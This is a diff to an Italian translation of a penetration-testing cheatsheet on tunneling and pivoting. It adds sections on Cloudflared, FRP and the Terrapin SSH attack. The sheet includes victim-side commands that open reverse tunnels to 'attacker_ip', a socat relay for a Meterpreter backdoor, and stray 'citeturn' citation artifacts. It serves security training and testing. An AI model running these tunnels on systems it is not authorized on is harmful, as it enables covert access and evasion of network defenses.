@@ -5,7 +5,7 @@
 ## Nmap tip
 
 > [!WARNING]
-> **ICMP** e **SYN** scans non possono essere tunnelizzati attraverso proxy socks, quindi dobbiamo **disabilitare la scoperta ping** (`-Pn`) e specificare **scansioni TCP** (`-sT`) affinché questo funzioni.
+> **ICMP** e **SYN** scans non possono essere tunnelizzati attraverso proxy socks, quindi dobbiamo **disabilitare la scoperta ping** (`-Pn`) e specificare **TCP scans** (`-sT`) affinché questo funzioni.
 
 ## **Bash**
 
@@ -87,9 +87,13 @@ Imposta un nuovo percorso sul lato client
 ```
 route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
+> [!NOTE]
+> **Sicurezza – Attacco Terrapin (CVE-2023-48795)**
+> L'attacco di downgrade Terrapin del 2023 può consentire a un attaccante man-in-the-middle di manomettere l'inizializzazione SSH e iniettare dati in **qualsiasi canale inoltrato** ( `-L`, `-R`, `-D` ). Assicurati che sia il client che il server siano aggiornati (**OpenSSH ≥ 9.6/LibreSSH 6.7**) o disabilita esplicitamente gli algoritmi vulnerabili `chacha20-poly1305@openssh.com` e `*-etm@openssh.com` in `sshd_config`/`ssh_config` prima di fare affidamento sui tunnel SSH. citeturn4search0
+
 ## SSHUTTLE
 
-Puoi **tunnelare** tutto il **traffico** verso una **sottorete** attraverso un host.\
+Puoi **tunneling** tramite **ssh** tutto il **traffico** verso una **sottorete** attraverso un host.\
 Ad esempio, inoltrando tutto il traffico che va a 10.10.10.0/24
 ```bash
 pip install sshuttle
@@ -238,7 +242,7 @@ interface_add_route --name "ligolo" --route 240.0.0.1/32
 [https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)
 
 Tunnel inverso. Il tunnel viene avviato dalla vittima.\
-Un proxy socks4 viene creato su 127.0.0.1:1080
+Viene creato un proxy socks4 su 127.0.0.1:1080
 ```bash
 attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
 ```
@@ -276,7 +280,7 @@ socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
 ```bash
 socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
 ```
-### Meterpreter attraverso SSL Socat
+### Meterpreter tramite SSL Socat
 ```bash
 #Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
 attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
@@ -354,7 +358,7 @@ C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
 ```
 Ora possiamo **connetterci** alla **vittima** tramite **RDP** utilizzando **`mstsc.exe`**, e dovremmo ricevere un **messaggio** che dice che il **plugin SocksOverRDP è abilitato**, e ascolterà su **127.0.0.1:1080**.
 
-**Connetti** tramite **RDP** e carica ed esegui nella macchina della vittima il binario `SocksOverRDP-Server.exe`:
+**Connettersi** tramite **RDP** e caricare ed eseguire nella macchina della vittima il binario `SocksOverRDP-Server.exe`:
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
@@ -362,7 +366,7 @@ Ora, conferma nella tua macchina (attaccante) che la porta 1080 è in ascolto:
 ```
 netstat -antb | findstr 1080
 ```
-Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per fare da proxy al traffico attraverso quella porta.**
+Ora puoi usare [**Proxifier**](https://www.proxifier.com/) **per fare il proxy del traffico attraverso quella porta.**
 
 ## Proxifica le app GUI di Windows
 
@@ -381,7 +385,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Autenticandosi contro un proxy, crea un collegamento a una porta locale che è inoltrata al servizio esterno specificato. Poi, puoi utilizzare lo strumento di tua scelta attraverso questa porta.\
+Autenticandosi contro un proxy, crea un binding di una porta localmente che è inoltrata al servizio esterno specificato. Poi, puoi utilizzare lo strumento di tua scelta attraverso questa porta.\
 Ad esempio, inoltra la porta 443.
 ```
 Username Alice
@@ -438,7 +442,7 @@ Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret som
 session -i <sessions_id>
 listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
 ```
-#### Cambiare DNS di proxychains
+#### Cambiare il DNS di proxychains
 
 Proxychains intercetta la chiamata `gethostbyname` della libc e instrada la richiesta DNS tcp attraverso il proxy socks. Per **default** il server **DNS** che proxychains utilizza è **4.2.2.2** (hardcoded). Per cambiarlo, modifica il file: _/usr/lib/proxychains3/proxyresolv_ e cambia l'IP. Se sei in un **ambiente Windows** puoi impostare l'IP del **domain controller**.
 
@@ -453,7 +457,7 @@ Proxychains intercetta la chiamata `gethostbyname` della libc e instrada la rich
 [https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
 [https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)
 
-È necessario avere i permessi di root in entrambi i sistemi per creare adattatori tun e instradare i dati tra di essi utilizzando richieste di echo ICMP.
+È necessario avere i privilegi di root in entrambi i sistemi per creare adattatori tun e instradare i dati tra di essi utilizzando richieste di echo ICMP.
 ```bash
 ./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
 ./hans -f -c <server_ip> -p P@ssw0rd -v
@@ -539,6 +543,71 @@ httpstatic:
 proto: http
 addr: file:///tmp/httpbin/
 ```
+## Cloudflared (Cloudflare Tunnel)
+
+Il demone `cloudflared` di Cloudflare può creare tunnel in uscita che espongono **servizi TCP/UDP locali** senza richiedere regole del firewall in entrata, utilizzando l'edge di Cloudflare come punto di incontro. Questo è molto utile quando il firewall in uscita consente solo il traffico HTTPS ma le connessioni in entrata sono bloccate.
+
+### Quick tunnel one-liner
+```bash
+# Expose a local web service listening on 8080
+cloudflared tunnel --url http://localhost:8080
+# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
+```
+### SOCKS5 pivot
+```bash
+# Turn the tunnel into a SOCKS5 proxy on port 1080
+cloudflared tunnel --url socks5://localhost:1080 --socks5
+# Now configure proxychains to use 127.0.0.1:1080
+```
+### Tunnel persistenti con DNS
+```bash
+cloudflared tunnel create mytunnel
+cloudflared tunnel route dns mytunnel internal.example.com
+# config.yml
+Tunnel: <TUNNEL-UUID>
+credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
+url: http://127.0.0.1:8000
+```
+Inizia il connettore:
+```bash
+cloudflared tunnel run mytunnel
+```
+Perché tutto il traffico esce dall'host **in uscita su 443**, i tunnel Cloudflared sono un modo semplice per bypassare le ACL in ingresso o i confini NAT. Tieni presente che il binario di solito viene eseguito con privilegi elevati – utilizza contenitori o il flag `--user` quando possibile. citeturn1search0
+
+## FRP (Fast Reverse Proxy)
+
+[`frp`](https://github.com/fatedier/frp) è un reverse-proxy in Go attivamente mantenuto che supporta **TCP, UDP, HTTP/S, SOCKS e P2P NAT-hole-punching**. A partire da **v0.53.0 (Maggio 2024)** può fungere da **SSH Tunnel Gateway**, quindi un host di destinazione può avviare un tunnel inverso utilizzando solo il client OpenSSH di base – nessun binario extra richiesto.
+
+### Tunnel TCP inverso classico
+```bash
+# Attacker / server
+./frps -c frps.toml            # listens on 0.0.0.0:7000
+
+# Victim
+./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000
+
+# frpc.toml
+serverAddr = "attacker_ip"
+serverPort = 7000
+
+[[proxies]]
+name       = "rdp"
+type       = "tcp"
+localIP    = "127.0.0.1"
+localPort  = 3389
+remotePort = 5000
+```
+### Utilizzando il nuovo gateway SSH (senza binario frpc)
+```bash
+# On frps (attacker)
+sshTunnelGateway.bindPort = 2200   # add to frps.toml
+./frps -c frps.toml
+
+# On victim (OpenSSH client only)
+ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
+```
+Il comando sopra pubblica la porta della vittima **8080** come **attacker_ip:9000** senza implementare alcun strumento aggiuntivo – ideale per il pivoting living-off-the-land. citeturn2search1
+
 ## Altri strumenti da controllare
 
 - [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
